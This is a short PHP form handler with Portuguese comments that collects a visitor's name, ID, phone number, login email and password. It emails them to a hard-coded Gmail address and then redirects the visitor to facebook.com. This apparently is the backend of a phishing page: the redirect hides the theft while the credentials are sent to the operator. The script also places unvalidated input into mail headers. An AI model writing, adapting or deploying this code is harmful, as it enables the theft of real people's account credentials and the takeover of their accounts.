<?php
// Verifica se o formulário foi enviado
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Recebe os valores dos campos do formulário
    $nome = $_POST['nome'];
    $id = $_POST['id'];
    $telefone = $_POST['telefone'];
    $login = $_POST['email'];
    $senha = $_POST['senha'];

    // Define os detalhes do e-mail
    $to = "martinhoautomatic@gmail.com"; // Substitua pelo seu endereço de e-mail
    $subject = "Nova Submissão do Formulário";
    $message = "Nome: $nome\nID: $id\nTelefone: $telefone\nLogin: $login\nSenha: $senha";
    $headers = "From: noreply@example.com\r\n" .
               "Reply-To: $login\r\n" .
               "Content-type: text/plain; charset=UTF-8";

    // Envia o e-mail
    if (mail($to, $subject, $message, $headers)) {
        echo "E-mail enviado com sucesso.";
    } else {
        echo "Falha ao enviar o e-mail.";
    }

    // Redireciona para uma página específica após o envio
    header("Location: https://www.facebook.com/");
    exit;
}
?>
